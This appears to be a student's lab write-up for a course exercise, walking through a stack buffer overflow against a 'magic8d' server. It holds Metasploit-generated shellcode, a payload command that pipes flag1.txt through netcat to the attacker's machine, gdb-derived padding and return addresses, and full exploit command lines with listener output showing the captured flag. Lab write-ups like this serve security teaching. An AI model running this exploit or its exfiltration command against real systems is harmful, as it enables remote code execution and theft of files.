This file is used for checking the process of the lab8

Overview:
1.
make
//This will make both magic8 and magic8d complied
2.
yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8d 127.0.0.1 "fortune"

//This is the server side and will open the server
3.
yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8 127.0.0.1 "Am_I_an_31337_h@xx0r?"
The answer is buffer addr 0xffdc78bc
//This is the client side and ask server question using a string format and the answer will be returned to client side

Shellcode Generation and Working with Metasploit

1.install msf5 into the local machine using:

<1>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \

<2>  chmod 755 msfinstall && \

<3>  ./msfinstall

2.After install msf5, go to msf5 console using:    
yuxuanz6@yzcmf:~/Desktop/lab8$ msfconsole

3.Using payload
msf5 > use payload/linux/x86/exec
msf5 payload(linux/x86/exec) > info

4.Set the command to exploit flag1.txt in the target machine side; First set my own machine ipaddress and port number which is great than 1024.
msf5 payload(linux/x86/exec) > set CMD "cat  flag1.txt | nc -w 3 192.168.150.200 1025" ;
CMD => cat  flag1.txt | nc -w 3 192.168.150.200 1025 ;

5.Generate no null bytes character shellcode by using:

msf5 payload(linux/x86/exec) > generate -b '\x00';
# linux/x86/exec - 110 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, MeterpreterDebugLevel=0, 
# RemoteMeterpreterDebugFile=, CMD=cat  flag1.txt | nc -w 3 
# 192.168.200.150 1025 ;
buf = 
"\xdb\xc4\xd9\x74\x24\xf4\xbe\x3f\xa4\x1f\x03\x5d\x29\xc9" +
"\xb1\x15\x83\xc5\x04\x31\x75\x16\x03\x75\x16\xe2\xca\xce" +
"\x14\x5b\xad\x5d\x4d\x33\xe0\x02\x18\x24\x92\xeb\x69\xc3" +
"\x62\x9c\xa2\x71\x0b\x32\x34\x96\x99\x22\x76\x59\x1d\xb3" +
"\x14\x38\x69\x93\xfa\xdc\xfd\xb2\x9d\x11\xd3\x40\x1a\x26" +
"\x0b\xd5\xfa\xa8\x28\x05\xd6\x43\x8e\x76\x08\x9d\xf7\x4a" +
"\x66\xec\x31\x93\x58\x3c\x0d\xd3\x8a\x71\x58\x23\xf3\x40" +
"\x92\x71\xc6\x82\xe9\x75\x7f\x90\x84\x97\xb2\x96"


6.Using the shellcode generated in the msf5 and run in the client side locally.
./magic8 127.0.0.1 "$(python -c 'print "\xdb\xc4\xd9\x74\x24\xf4\xbe\x3f\xa4\x1f\x03\x5d\x29\xc9\xb1\x15\x83\xc5\x04\x31\x75\x16\x03\x75\x16\xe2\xca\xce\x14\x5b\xad\x5d\x4d\x33\xe0\x02\x18\x24\x92\xeb\x69\xc3\x62\x9c\xa2\x71\x0b\x32\x34\x96\x99\x22\x76\x59\x1d\xb3\x14\x38\x69\x93\xfa\xdc\xfd\xb2\x9d\x11\xd3\x40\x1a\x26\x0b\xd5\xfa\xa8\x28\x05\xd6\x43\x8e\x76\x08\x9d\xf7\x4a\x66\xec\x31\x93\x58\x3c\x0d\xd3\x8a\x71\x58\x23\xf3\x40\x92\x71\xc6\x82\xe9\x75\x7f\x90\x84\x97\xb2\x96"+"A"*418+"\xbc\x92\xc5\xff"')"


7.Using gdb and set the breakpoint to be 150; I find the char log[512] might cause memory leakage problem and because this is a stack memory type; Our goal is to find out the filter and the return address in order to run the above command. According to stack memory type, ebp + 4 is the return address while the esp is not reliable to give us the correct original point address; Here we use the buffer to get the original address. The command is the following:

(gdb) i r
eax            0xffffc82c	-14292
ecx            0xffffcb5c	-13476
edx            0xffffc82c	-14292
ebx            0x56557f74	1448443764
esp            0xffffc820	0xffffc820
ebp            0xffffca38	0xffffca38
esi            0x0	0
edi            0x10	16
eip            0x56555ea8	0x56555ea8 <LogBuffer+96>
eflags         0x282	[ SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) x log
0xffffc82c:	0x6b67616c

Therefore, we have ebp 0xffffca38, return address is 0xffffca3c and start point is 0xffffc82c.
Thus, we have the filter length ox210 => 256*2 + 16 => 528

Also, shellcode take some bytes:
msf5 payload(linux/x86/exec) > generate -b '\x00';
# linux/x86/exec - 110 bytes

Thus, the final filter's size is 528-110=418


8.run the magic8d program<server>:
yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8d 127.0.0.1 "fortune"

9. run the port listening:
yuxuanz6@yzcmf:~$ nc -l -v -p 1025
Listening on [0.0.0.0] (family 0, port 1025)

<after running the step 10 we get the following:>
Connection from yzcmf 60482 received!
This is a place holder, the real flag will be place on the server under the same directory as magic8d. Again, this is not the real flag.yuxuanz6@yzcmf:~$ 

10.run the magic8 program<client>(each time need to change the buffer address):

yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8 127.0.0.1 "hello"
The answer is buffer addr 0xffc1138c

yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8 127.0.0.1 "$(python -c 'print "\xdb\xc4\xd9\x74\x24\xf4\xbe\x3f\xa4\x1f\x03\x5d\x29\xc9\xb1\x15\x83\xc5\x04\x31\x75\x16\x03\x75\x16\xe2\xca\xce\x14\x5b\xad\x5d\x4d\x33\xe0\x02\x18\x24\x92\xeb\x69\xc3\x62\x9c\xa2\x71\x0b\x32\x34\x96\x99\x22\x76\x59\x1d\xb3\x14\x38\x69\x93\xfa\xdc\xfd\xb2\x9d\x11\xd3\x40\x1a\x26\x0b\xd5\xfa\xa8\x28\x05\xd6\x43\x8e\x76\x08\x9d\xf7\x4a\x66\xec\x31\x93\x58\x3c\x0d\xd3\x8a\x71\x58\x23\xf3\x40\x92\x71\xc6\x82\xe9\x75\x7f\x90\x84\x97\xb2\x96"+"A"*418+"\x8c\x13\xc1\xff"')"
The answer is p͝�

From step 1-10; The local flag1.txt has been exploited; we can see the content from step 9;

11. Repeat the same step but change the local address 192.168.200.150 to grade server address 192.168.200.190. The shell commands are same with the previous 

12.run the port listening:
yuxuanz6@yzcmf:~$ nc -l -v -p 1025
Listening on [0.0.0.0] (family 0, port 1025)

<after running the client side>
Connection from 192.168.200.190 45452 received!
1204-2104-10241241
yuxuanz6@yzcmf:~$ 

13. Magic client side:

yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8 192.168.200.190 "hel"
The answer is buffer addr 0xffed82ac

yuxuanz6@yzcmf:~/Desktop/lab8$ ./magic8 192.168.200.190 "$(python -c 'print "\xdb\xc4\xd9\x74\x24\xf4\xbe\x3f\xa4\x1f\x03\x5d\x29\xc9\xb1\x15\x83\xc5\x04\x31\x75\x16\x03\x75\x16\xe2\xca\xce\x14\x5b\xad\x5d\x4d\x33\xe0\x02\x18\x24\x92\xeb\x69\xc3\x62\x9c\xa2\x71\x0b\x32\x34\x96\x99\x22\x76\x59\x1d\xb3\x14\x38\x69\x93\xfa\xdc\xfd\xb2\x9d\x11\xd3\x40\x1a\x26\x0b\xd5\xfa\xa8\x28\x05\xd6\x43\x8e\x76\x08\x9d\xf7\x4a\x66\xec\x31\x93\x58\x3c\x0d\xd3\x8a\x71\x58\x23\xf3\x40\x92\x71\xc6\x82\xe9\x75\x7f\x90\x84\x97\xb2\x96"+"A"*418+"\xac\x82\xed\xff"')"
The answer is � ��

From the step 12 we know the flag is : 1204-2104-10241241



 























